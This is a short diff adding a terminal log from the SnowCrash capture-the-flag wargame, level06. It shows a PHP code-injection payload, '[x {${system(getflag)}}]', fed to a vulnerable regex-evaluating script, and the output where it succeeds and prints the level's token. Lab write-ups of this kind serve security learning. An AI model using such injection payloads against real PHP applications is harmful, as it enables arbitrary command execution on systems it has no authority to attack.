@@ -1,0 +1,5 @@
+level06@SnowCrash:~$ echo '[x {${system(getflag)}}]' > /tmp/input
+level06@SnowCrash:~$ ./level06 /tmp/input
+PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
+Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
